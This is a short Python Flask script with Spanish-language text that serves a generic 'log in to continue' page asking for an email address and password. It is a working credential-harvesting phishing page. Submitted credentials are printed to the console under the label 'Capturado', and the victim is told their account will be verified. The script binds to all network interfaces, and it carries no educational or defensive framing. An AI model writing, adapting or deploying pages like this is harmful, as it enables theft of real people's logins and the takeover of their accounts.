from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        print(f'⚠️ Capturado: Correo: {email}, Clave: {password}')
        return '<h2>Gracias. Verificaremos tu cuenta.</h2>'
    
    return render_template_string('''
        <h2>Inicia sesión para continuar</h2>
        <form method="post">
            Correo: <input type="email" name="email" required><br><br>
            Clave: <input type="password" name="password" required><br><br>
            <input type="submit" value="Iniciar sesión">
        </form>
    ''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
